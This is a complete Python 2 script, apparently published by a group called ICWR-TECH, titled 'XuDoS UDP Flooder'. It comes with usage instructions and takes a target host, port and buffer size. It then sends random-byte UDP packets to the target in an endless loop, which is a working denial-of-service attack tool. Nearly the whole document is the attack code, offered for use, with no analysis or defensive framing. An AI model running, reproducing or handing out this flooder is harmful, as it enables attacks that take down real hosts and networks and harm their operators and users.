#!/usr/bin/python

#############################################
# Coded By Afrizal F.A - ICWR-TECH          #
# XuDoS - Python UDP Flooder                #
# How To Use :                              #
# python2 udp.py <host> <port> <size>       #
# Max Buffer Size 65000 Byte                #
#############################################

import socket
import random
import sys
import time

print """
#################################
#                               #
# XuDoS UDP Flooder - ICWR-TECH #
#                               #
#################################
"""
host = sys.argv[1]
port = int(sys.argv[2])
byte = int(sys.argv[3])
print "Setting Up...\n"
print "Set Host => " + sys.argv[1]
print "Set Port => " + sys.argv[2]
print "Set Buffer Size => " + sys.argv[3]
time.sleep(1)
print "\n"
self = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(byte)
send = 0

while True:
	send = send + 1
	pack = int(send)
	sys.stdout.write("\rSend Packets %s => %s"%(pack, host))
	self.sendto(bytes, (host, port))
